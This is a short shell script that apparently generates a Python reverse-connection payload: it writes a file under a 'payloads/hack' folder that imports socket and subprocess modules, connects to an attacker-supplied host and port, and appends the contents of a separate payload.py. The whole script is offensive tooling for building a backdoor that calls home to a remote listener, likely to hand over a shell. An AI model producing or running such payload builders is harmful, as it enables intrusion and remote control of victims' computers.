echo "import socket
from subprocess import Popen,PIPE
import os
import sys
import time
s = socket.socket()
s.connect(('$1',$2))
">>$HOME/Desktop/payloads/hack/$3
cat payload.py>>$HOME/Desktop/payloads/hack/$3

